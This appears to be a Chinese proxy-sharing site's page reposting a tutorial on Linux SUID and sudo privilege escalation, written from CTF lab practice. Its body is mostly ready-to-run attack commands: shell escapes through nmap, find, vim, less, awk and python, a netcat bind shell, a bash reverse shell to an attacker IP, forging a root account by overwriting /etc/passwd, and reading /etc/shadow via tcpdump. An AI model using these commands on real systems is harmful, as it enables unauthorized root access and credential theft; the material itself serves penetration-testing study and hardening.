@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+        <link rel="canonical" href="https://windowsv2ray.github.io/news/article-53193.htm" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Linux-SUID提权_在线工具Live2D</title>
+        <meta name="description" content="最近打靶场的时候最后都会涉及到提权，所以想着总结一下。  SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者" />
+        <link rel="icon" href="/assets/website/img/windowsv2ray/favicon.ico" type="image/x-icon"/>
+
+    <meta name="author" content="Windows V2ray分享订阅站">
+    <meta property="og:type" content="article" />
+    <meta property="og:url" content="https://windowsv2ray.github.io/news/article-53193.htm" />
+    <meta property="og:site_name" content="Windows V2ray分享订阅站" />
+    <meta property="og:title" content="Linux-SUID提权_在线工具Live2D" />
+    <meta property="og:image" content="https://windowsv2ray.github.io/uploads/20240604/5b87a6f5ce71e7182137e356b5bf19d6.webp" />
+        <meta property="og:release_date" content="2025-02-08T04:41:10" />
+    <meta property="og:updated_time" content="2025-02-08T04:41:10" />
+        <meta property="og:description" content="最近打靶场的时候最后都会涉及到提权，所以想着总结一下。  SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者" />
+        
+    <meta name="applicable-device" content="pc,mobile" />
+    <meta name="renderer" content="webkit" />
+    <meta name="force-rendering" content="webkit" />
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta name="robots" content="max-image-preview:large" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="Linux-SUID提权_在线工具Live2D">
+    <meta name="format-detection" content="telephone=no">
+
+    <link rel="dns-prefetch" href="https:/www.googletagmanager.com">
+    <link rel="dns-prefetch" href="https://www.googleadservices.com">
+    <link rel="dns-prefetch" href="https://www.google-analytics.com">
+    <link rel="dns-prefetch" href="https://pagead2.googlesyndication.com">
+    <link rel="dns-prefetch" href="https://cm.g.doubleclick.net">
+    
+    <link rel="stylesheet" href="/assets/website/js/frontend/windowsv2ray/animate/animate.css">
+    <link rel="stylesheet" href="/assets/website/css/windowsv2ray/bootstrap.css">
+    <link rel="stylesheet" href="/assets/website/css/windowsv2ray/maicons.css">
+    <link rel="stylesheet" href="/assets/website/js/frontend/windowsv2ray/owl-carousel/css/owl.carousel.css">
+    <link rel="stylesheet" href="/assets/website/css/windowsv2ray/theme.css">
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-JN82W0GJX5"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-JN82W0GJX5');
+</script>
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3332997411212854"
+     crossorigin="anonymous"></script>
+</head>
+
+<body data-page="detail">
+    <!-- Back to top button -->
+    <div class="back-to-top"></div>
+    <header>
+                <nav class="navbar navbar-expand-lg navbar-light navbar-float">
+            <div class="container">
+                <a href="/" class="navbar-brand">
+                                <span>Windows V2ray</span>
+                                </a>
+                <button class="navbar-toggler" data-toggle="collapse" data-target="#navbarContent" aria-controls="navbarContent" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="navbar-collapse collapse" id="navbarContent">
+                    <ul class="navbar-nav ml-lg-4 pt-3 pt-lg-0">
+                                                <li class="nav-item">
+                            <a href="/" class="nav-link">首页</a>
+                        </li>
+                                                <li class="nav-item">
+                            <a href="/free-nodes/" class="nav-link">免费节点</a>
+                        </li>
+                                                <li class="nav-item">
+                            <a href="/paid-subscribe/" class="nav-link">推荐机场</a>
+                        </li>
+                                                <li class="nav-item">
+                            <a href="/client.htm" class="nav-link">客户端</a>
+                        </li>
+                                                <li class="nav-item">
+                            <a href="/news/" class="nav-link">新闻资讯</a>
+                        </li>
+                                            </ul>
+                </div>
+            </div>
+        </nav>
+        <div class="container mt-5">
+            <div class="page-banner">
+                <div class="row justify-content-center align-items-center h-100">
+                    <div class="col-md-10">
+                        <h1 class="text-center">Linux-SUID提权_在线工具Live2D</h1>
+                        <nav aria-label="Breadcrumb">
+                            <ul class="breadcrumb justify-content-center py-0 bg-transparent">
+                                <li class="breadcrumb-item"><a href="/">首页</a></li>
+                                <li class="breadcrumb-item"><a href="/news/">新闻资讯</a></li>
+                                <li class="breadcrumb-item active">正文</li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <main>
+        <div class="page-section">
+            <div class="container">
+                <div class="row">
+                    <div class="col-md-9">
+                                        <input type="hidden" id="share-website-info" data-name="" data-url="">
+                  				  				  				</h1> <p>最近打靶场的时候最后都会涉及到提权，所以想着总结一下。</p> </h1> <p>SUID（设置用户ID）是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。<br /> 那么，为什么要给Linux二进制文件设置这种权限呢？其实原因有很多，例如，程序ping需要root权限才能打开网络套接字，但执行该程序的用户通常都是由普通用户，来验证与其他主机的连通性。<br /> 但是，如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root。</p> <p>比如<code>password</code>的权限：</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/08b5e8a7d180250b1fd8c089e641b65c.jpg" alt="Linux-SUID提权_在线工具Live2D"><br /> 用户可以输入自己的密码或者不需要密码在root权限下执行命令，这可在设置文件 /etc/sudoers 中配置</p> <h2 id="11-etcsudoers-语法">1.1 /etc/sudoers 语法</h2> <pre><code>root ALL=(ALL) ALL</code></pre> <p>root 用户可以从 ALL（任何）终端执行，充当ALL（任何）用户，并运行ALL（任何）命令。第一部分指定用户，第二部分指定可充当用户，第三部分指定 sudo 可运行的命令。</p> <pre><code>touhid ALL= /sbin/poweroff</code></pre> <p>输入 touchid 的密码，可以 sudo 执行 poweroff 命令。</p> <pre><code>touhid ALL = (root) NOPASSWD: /usr/bin/find</code></pre> <p>不输入密码,可以 sudo 执行 find 命令</p> <h2 id="12-查找具有-suid-权限位文件">1.2 查找具有 SUID 权限位文件</h2> <p>以下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</p> <pre><code># suid权限值就是4000，下面两个语句一个意思 find / -user root -perm -4000 -print 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null</code></pre> <p>也可以使用<code>sudo -l</code> 命令列出当前用户可执行的命令:</p> <p><img decoding="async" src="http://img.555519.xyz/uploads3/20220509/22b8f6accfcc934f93a3cc164a5f4632.jpg" alt="Linux-SUID提权_在线工具Live2D"></p> </h1> <h2 id="21-nmap">2.1 nmap</h2> <p>nmap（2.02-5.21）存在交换模式，可利用提权</p> <pre><code>nmap --interactive</code></pre> <p>之后执行：</p> <pre><code>nmap&gt; !sh sh-3.2# whoami root</code></pre> <p>msf中的模块为：</p> <pre><code>exploit/unix/local/setuid_nmap</code></pre> <p>较新版可使用 --script 参数：</p> <pre><code>echo "os.execute('/bin/sh')" &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse</code></pre> <h2 id="22-find">2.2 find</h2> <p>find比较常用,find用来在系统中查找文件。同时，它也有执行命令的能力。 因此，如果配置为使用SUID权限运行，则可以通过find执行的命令都将以root身份去运行。</p> <pre><code>touch test find test -exec whoami \;</code></pre> <pre><code>进入shell find test -exec '/bin/sh' \; sh-5.0# whoami root</code></pre> <p>linux一般都安装了nc 我们也可以利用nc 广播或反弹shell</p> <p>广播shell:</p> <pre><code>find test -exec netcat -lvp 5555 -e /bin/sh \;</code></pre> <p>kali(攻击机)上:</p> <pre><code>nc 靶机ip 4444</code></pre> <p>反弹shell:</p> <pre><code>find test -exec bash -c 'bash -i &gt;&amp; /dev/tcp/攻击机IP/4444 0&gt;&amp;1' \;</code></pre> <p>kali(攻击机)上：</p> <pre><code>nc -lvnp 4444</code></pre> <h2 id="23-vivim">2.3 vi/vim</h2> <p>打开vim,按下ESC</p> <pre><code>:set shell=/bin/sh :shell</code></pre> <p>或者</p> <pre><code>sudo vim -c '!sh'</code></pre> <h2 id="24-bash">2.4 bash</h2> <pre><code>bash -p bash-3.2# id uid=1002(service) gid=1002(service) euid=0(root) groups=1002(service)</code></pre> <h2 id="25-less">2.5 less</h2> <p><strong>注意事项：我记得less跟more提权的时候那个命令行要拉低一点，不能在一页显示完文件才行(要注意的是使用more和less一定读取一个比较大的文件,如果文件太小无法进入翻页功能也就无法使用!命令进入shell)</strong></p> <pre><code>less /etc/passwd !/bin/sh</code></pre> <h2 id="26-more">2.6 more</h2> <pre><code>more /home/pelle/myfile !/bin/bash</code></pre> <h2 id="27-cp">2.7 cp</h2> <p>覆盖<code>/etc/shadow</code> 或<code>/etc/passwd</code></p> <pre><code>[zabbix@localhost ~]$ cat /etc/passwd &gt;passwd 2.[zabbix@localhost ~]$ openssl passwd -1 -salt hack hack123 3.$1$hack$WTn0dk2QjNeKfl.DHOUue0 4.[zabbix@localhost ~]$ echo 'hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash' &gt;&gt; passwd 5.[zabbix@localhost ~]$ cp passwd /etc/passwd 6.[zabbix@localhost ~]$ su - hack 7.Password: 8.[root@361way ~]# id 9.uid=0(hack) gid=0(root) groups=0(root) 10.[root@361way ~]# cat /etc/passwd|tail -1 11.hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::/root/:/bin/bash</code></pre> <h2 id="28-mv">2.8 mv</h2> <p>覆盖<code>/etc/shadow</code> 或<code>/etc/passwd</code></p> <h2 id="29-nano">2.9 nano</h2> <p>nano也算是比较上古的文本编辑器了</p> <p>nano进入shell的方法为</p> <pre><code>nano #进入nano编辑器 Ctrl + R Ctrl + X  #即可输入命令</code></pre> <h2 id="210-awk">2.10 awk</h2> <pre><code>awk 'BEGIN {system("/bin/sh")}'</code></pre> <h2 id="211-man">2.11 man</h2> <pre><code>man passwd !/bin/bash</code></pre> <h2 id="212-wget">2.12 wget</h2> <pre><code>wget http://192.168.56.1:8080/passwd -O /etc/passwd</code></pre> <h2 id="213-apache">2.13 apache</h2> <p>仅可查看文件，不能弹 shell：</p> <pre><code>apache2 -f /etc/shadow</code></pre> <h2 id="214-tcpdump">2.14 tcpdump</h2> <pre><code>echo $'id\ncat /etc/shadow' &gt; /tmp/.test chmod +x /tmp/.test sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></pre> <h2 id="215-pythonperlrubyluaphpetc">2.15 python/perl/ruby/lua/php/etc</h2> <p>python:</p> <pre><code>python -c "import os;os.system('/bin/bash')"</code></pre> <p>perl:</p> <pre><code>exec "/bin/bash";</code></pre> <p>其他的语言反弹shell参考以下链接：<br /><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://weibell.github.io/reverse-shell-generator/"  target="_blank" rel="nofollow">https://weibell.github.io/reverse-shell-generator/</a></p> <p>参考链接：</p> <ul> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://touhidshaikh.com/blog/?p=790"  title="Abusing SUDO (Linux Privilege Escalation)" target="_blank" rel="nofollow">Abusing SUDO (Linux Privilege Escalation)</a></li> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.anquanke.com/post/id/86979"  title="【安全科普】Linux提权——利用可执行文件SUID" target="_blank" rel="nofollow">【安全科普】Linux提权——利用可执行文件SUID</a></li> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://www.jianshu.com/p/e6c4c4bdf7c3"  title="linux特殊权限SUID、SGID、SBIT" target="_blank" rel="nofollow">linux特殊权限SUID、SGID、SBIT</a></li> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=http://101.200.63.12/index.php/archives/521/"  title="SUID 提权 - CoColi丶" target="_blank" rel="nofollow">SUID 提权 - CoColi丶</a></li> <li><a href="http://www.m6000.cn/wp-content/themes/begin%20lts/inc/go.php?url=https://evi1cg.me/archives/SUID_Privilege_Escalation.html"  title="SUID Privilege Escalation - Evi1cg" target="_blank" rel="nofollow">SUID Privilege Escalation - Evi1cg</a></li> </ul> </h1> <p>SUID提权由来已久,属于一种古早的提权技术,但其生命力经久不衰。</p> <p>这要求管理员要仔细研究具有SUID权限的文件,不要给易被利用的文件以SUID权限,防止SUID的滥用导致黑客在进入服务器时轻易获取root权限。</p> 			                <div class="clearfix"></div>
+                <div class="col-md-12 mt-5">
+                                        <p>上一个：<a href="/news/article-52662.htm">动物疫苗注射的途径有哪些（动物疫苗接种方法）</a></p>
+                                        <p>下一个：<a href="/news/article-53194.htm">宠物食品带货（宠物食品代理怎么做）</a></p>
+                                    </div>
+                                    </div>
+                    <div class="col-md-3">
+                        <div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">热门文章</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2"><a href="/free-nodes/2024-12-2-shadowrocket-node.htm" title="「12月2日」最高速度19.7M/S，2024年SSR/Shadowrocket/Clash/V2ray每天更新免费节点订阅链接">「12月2日」最高速度19.7M/S，2024年SSR/Shadowrocket/Clash/V2ray每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-51054.htm" title="动物医院有公立的吗还是私立医院好呢（动物医院归哪里管）">动物医院有公立的吗还是私立医院好呢（动物医院归哪里管）</a></li>
+                        <li class="py-2"><a href="/news/article-45055.htm" title="动物医院叫什么医院名称好听 动物医院叫什么医院名称好听点">动物医院叫什么医院名称好听 动物医院叫什么医院名称好听点</a></li>
+                        <li class="py-2"><a href="/news/article-25304.htm" title="宠物家庭寄养协议书范本下载（宠物寄养协议有法律效力吗）">宠物家庭寄养协议书范本下载（宠物寄养协议有法律效力吗）</a></li>
+                        <li class="py-2"><a href="/news/article-42065.htm" title="学宠物医生需要什么学历才能考公务员（当宠物医生考什么大学）">学宠物医生需要什么学历才能考公务员（当宠物医生考什么大学）</a></li>
+                        <li class="py-2"><a href="/free-nodes/2025-2-6-free-node-subscribe-links.htm" title="「2月6日」最高速度18.9M/S，2025年Clash/SSR/Shadowrocket/V2ray每天更新免费节点订阅链接">「2月6日」最高速度18.9M/S，2025年Clash/SSR/Shadowrocket/V2ray每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-54282.htm" title="PHP对象继承">PHP对象继承</a></li>
+                        <li class="py-2"><a href="/free-nodes/2024-11-19-free-v2ray-subscribe.htm" title="「11月19日」最高速度18.2M/S，2024年Shadowrocket/SSR/V2ray/Clash每天更新免费节点订阅链接">「11月19日」最高速度18.2M/S，2024年Shadowrocket/SSR/V2ray/Clash每天更新免费节点订阅链接</a></li>
+                        <li class="py-2"><a href="/news/article-37137.htm" title="布偶猫很少有人养（布偶不好养吗）">布偶猫很少有人养（布偶不好养吗）</a></li>
+                        <li class="py-2"><a href="/news/article-52133.htm" title="河南省兽用疫苗中心电话查询（郑州兽用疫苗）">河南省兽用疫苗中心电话查询（郑州兽用疫苗）</a></li>
+                    </ul>
+    </div>
+</div>
+
+<div class="panel panel-default">
+    <div class="panel-heading">
+        <h3 class="panel-title">归纳</h3>
+    </div>
+    <div class="panel-body">
+        <ul class="p-0 x-0" style="list-style: none;margin: 0;padding: 0;">
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">30</span> <a href="/date/2025-02/" title="2025-02 归档">2025-02</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">92</span> <a href="/date/2025-01/" title="2025-01 归档">2025-01</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">93</span> <a href="/date/2024-12/" title="2024-12 归档">2024-12</a></h4>
+            </li>
+                        <li class="py-2">
+                <h4><span class="badge" style="float: right;">30</span> <a href="/date/2024-11/" title="2024-11 归档">2024-11</a></h4>
+            </li>
+                    </ul>
+    </div>
+</div>
+
+
+
+                    </div>
+                </div>
+            </div> <!-- .container -->
+        </div> <!-- .page-section -->
+    </main>
+        <footer class="page-footer">
+        <div class="container">
+            <div class="row">
+                <div class="col-sm-6 py-2">
+                    <p id="copyright">
+                            <p>
+                                <a href="/">首页</a> | 
+                                <a href="/free-node/">免费节点</a> | 
+                                <a href="/news/">新闻资讯</a> |
+                                <a href="/about-us.htm">关于我们</a> |
+                                <a href="/disclaimer.htm">免责申明</a> |
+                                <a href="/privacy.htm">隐私申明</a> |
+                                <a href="/sitemap.xml">网站地图</a>
+                            </p>
+                        Windows V2ray分享订阅站 版权所有 Powered by WordPress
+                    </p>
+                </div>
+                <div class="col-sm-6 py-2 text-right">
+                    <div class="d-inline-block px-3">
+                        <a href="#">Privacy</a>
+                    </div>
+                    <div class="d-inline-block px-3">
+                        <a href="#">Contact Us</a>
+                    </div>
+                </div>
+            </div>
+        </div> <!-- .container -->
+    </footer> <!-- .page-footer -->
+    <script src="/assets/website/js/frontend/windowsv2ray/jquery-3.5.1.min.js"></script>
+    <script src="/assets/website/js/frontend/windowsv2ray/bootstrap.bundle.min.js"></script>
+    <script src="/assets/website/js/frontend/windowsv2ray/wow/wow.min.js"></script>
+    <script src="/assets/website/js/frontend/windowsv2ray/owl-carousel/js/owl.carousel.min.js"></script>
+    <script src="/assets/website/js/frontend/windowsv2ray/waypoints/jquery.waypoints.min.js"></script>
+    <script src="/assets/website/js/frontend/windowsv2ray/animateNumber/jquery.animateNumber.min.js"></script>
+    <script src="/assets/website/js/frontend/windowsv2ray/theme.js"></script>
+    <script src="https://www.freeclashnode.com/assets/js/frontend/invite-url.js"></script>
+    <script src="/assets/website/js/frontend/G.js"></script>
+</body>
+
+</html>
